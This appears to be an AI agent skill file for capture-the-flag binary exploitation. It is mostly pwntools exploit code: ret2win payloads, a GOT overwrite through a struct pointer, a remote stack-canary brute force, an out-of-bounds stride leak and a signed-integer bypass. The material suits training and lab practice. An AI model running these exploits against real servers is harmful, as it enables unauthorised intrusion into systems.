---
name: pwn-basics
description: "CTF binary exploitation basics. Stack buffer overflow, ret2win, stack alignment, offset calculation, cyclic pattern, struct pointer overwrite, signed integer bypass, canary brute-force on forking servers, OOB read via stride. Triggers: 'buffer overflow', 'ret2win', 'stack overflow', 'pwn basics', 'bof', 'binary exploitation basics', 'stack smashing', 'overflow offset', 'cyclic pattern', 'stack canary bypass'."
---

# CTF Pwn: Buffer Overflow Basics

Stack BOF, ret2win, cyclic offset, stack alignment, canary bypass, struct pointer overwrite.

## Install

```bash
pip install pwntools --break-system-packages
apt-get install -y gdb gdb-multiarch patchelf checksec
pip install pwndbg --break-system-packages
```

---

## Phase 1: Reconnaissance

```bash
BINARY="./challenge"

checksec $BINARY          # protections
file $BINARY              # architecture
strings $BINARY | grep -iE "flag|win|secret"  # quick win?
objdump -d $BINARY | grep "<win\|<flag\|<secret\|<shell"  # hidden functions
```

---

## Phase 2: Find Overflow Offset

```bash
# Generate cyclic pattern:
python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt

# Run with GDB:
gdb -q $BINARY
(gdb) run < pattern.txt
(gdb) x/wx $rsp       # RSP value after crash
# OR: (gdb) info registers rsp

# Find offset:
python3 -c "from pwn import *; print(cyclic_find(0x61616161))"  # replace with crashed RSP value
# OR:
python3 -c "from pwn import *; print(cyclic_find(b'faab'))"

# From disassembly:
# sub $0x70, %rsp  → buffer = 0x70 = 112 bytes
# lea -0x70(%rbp), %rax → buffer at rbp-112
# offset to ret addr = 112 + 8 (saved rbp) = 120
```

---

## Phase 3: ret2win (Simple)

```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

win = elf.symbols['win']   # or get_addr from objdump

OFFSET = 120   # from cyclic_find

# Stack alignment fix (Ubuntu/glibc requires 16-byte alignment for movaps):
ret_gadget = 0x40101a   # find via: ROPgadget --binary binary | grep "ret$"

payload = b'A' * OFFSET
payload += p64(ret_gadget)   # align
payload += p64(win)

p.sendline(payload)
p.interactive()
```

### ret2win with Magic Argument

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)
p = process('./binary')

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
win = elf.symbols['win']
MAGIC = 0x1337c0decafebeef
OFFSET = 120

payload = flat(b'A' * OFFSET, ret, pop_rdi, MAGIC, win)
p.sendline(payload)
p.interactive()
```

---

## Phase 4: Find Gadgets

```bash
# ROPgadget:
ROPgadget --binary $BINARY | grep "pop rdi"
ROPgadget --binary $BINARY | grep "ret$"

# Ropper:
ropper -f $BINARY --search "pop rdi"

# pwntools:
python3 -c "from pwn import *; e=ELF('./binary'); r=ROP(e); print(hex(r.find_gadget(['pop rdi','ret'])[0]))"

# Hidden gadgets in CMP immediates (small binaries):
# cmp $0xDEADBEEF, %rax  →  bytes: 0xBEEF... can decode as gadgets
objdump -d $BINARY | grep -A1 "cmp.*0x"
# ROPgadget finds these automatically
```

---

## Phase 5: Struct Pointer Overwrite (Heap Challenges)

```python
from pwn import *

p = process('./binary')

# Struct layout:
# char name[36]    ← buffer (offset 0x00)
# int *grade_ptr   ← pointer (offset 0x24)

WIN = 0x08049316
GOT_PRINTF = 0x0804c00c   # printf@GOT

# Overflow name into grade_ptr:
def create(name, grade, gpa):
    p.sendline(b'1')
    p.sendline(name.encode())
    p.sendline(str(grade).encode())
    p.sendline(str(gpa).encode())

def modify_name(idx, data):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.send(data)

def modify_grade(idx, val):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.sendline(str(val).encode())

create("AAAA", 5, 3.5)
modify_name(0, b'A' * 36 + p32(GOT_PRINTF))  # overwrite pointer
modify_grade(0, str(WIN))                      # write to GOT via corrupted pointer
p.interactive()
```

---

## Phase 6: Stack Canary Byte-by-Byte Brute (Forking Servers)

```python
from pwn import *

HOST, PORT = "target", 1337
OFFSET = 64   # bytes to canary

def try_byte(known_canary, guess):
    """Return True if guess is correct (no crash)."""
    try:
        p = remote(HOST, PORT, timeout=3)
        payload = b'A' * OFFSET + known_canary + bytes([guess])
        p.send(payload)
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash
    except:
        return False  # Crash = wrong byte

# Byte 0 is always \x00:
canary = b'\x00'
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary[{byte_pos}] = {guess:#04x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Canary: {canary.hex()}")

# Now build full exploit with leaked canary + ROP:
p = remote(HOST, PORT)
WIN_ADDR = 0xdeadbeef   # target address
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(WIN_ADDR)
p.sendline(payload)
p.interactive()
```

---

## Phase 7: OOB Read via Stride Leak

```python
from pwn import *

# Pattern: string processing with user-controlled step size
# Walks input buffer past null terminator at stride > buffer_size
# → reads canary/ret addr from stack

HOST, PORT = "target", 1337

def read_byte_at(offset):
    """Read single byte at stack offset via stride leak."""
    p = remote(HOST, PORT, timeout=5)
    p.sendline(b'A' * 31)         # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # stride = offset → reads input[0] then input[offset]
    p.sendline(b'2')              # output length = 2 bytes
    resp = p.recvline().strip()
    p.close()
    return resp[1:2] if len(resp) > 1 else b'\x00'

# Leak canary (at offsets 72-79, first byte always 0x00):
canary = b'\x00'
for off in range(73, 80):
    canary += read_byte_at(off)
print(f"Canary: {canary.hex()}")

# Leak return address (at offsets 88-93):
ret_bytes = b''
for off in range(88, 94):
    ret_bytes += read_byte_at(off)
ret_addr = u64(ret_bytes.ljust(8, b'\x00'))
pie_base = ret_addr - 0x1234  # adjust offset for known function
print(f"PIE base: {hex(pie_base)}")
```

---

## Signed Integer Bypass

```python
# scanf("%d") reads signed int: send negative to bypass size check
# e.g., if (count > MAX_SIZE) { error; }
# count = -1 → (unsigned)count = 0xFFFFFFFF → passes check but causes large alloc

p.sendline(b'-1')   # bypass positive size check
```

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working exploit
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-rop` for ROP chains and ret2libc
→ `ctf-reverse-tools` for binary analysis first
